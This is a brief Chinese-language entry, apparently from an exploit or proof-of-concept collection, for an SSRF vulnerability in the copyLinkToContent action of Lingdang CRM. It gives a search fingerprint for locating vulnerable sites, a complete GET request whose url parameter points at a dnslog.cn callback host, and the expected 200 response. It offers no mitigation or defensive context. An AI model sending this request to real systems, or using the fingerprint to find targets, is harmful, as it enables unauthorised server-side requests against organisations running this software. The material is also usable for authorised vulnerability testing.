# 灵当CRMcopyLinkToContent存在SSRF漏洞

灵当 ｜ SSRF ｜ —
- **指纹**：`body="crmcommon/js/jquery/jquery-1.10.1.min.js"`
- **请求**：`GET /crm/WeiXinApp/marketing/index.php?module=Articles&action=copyLinkToContent&url=http://222.sc3l59.dnslog.cn HTTP/1.1`
- **响应特征**：200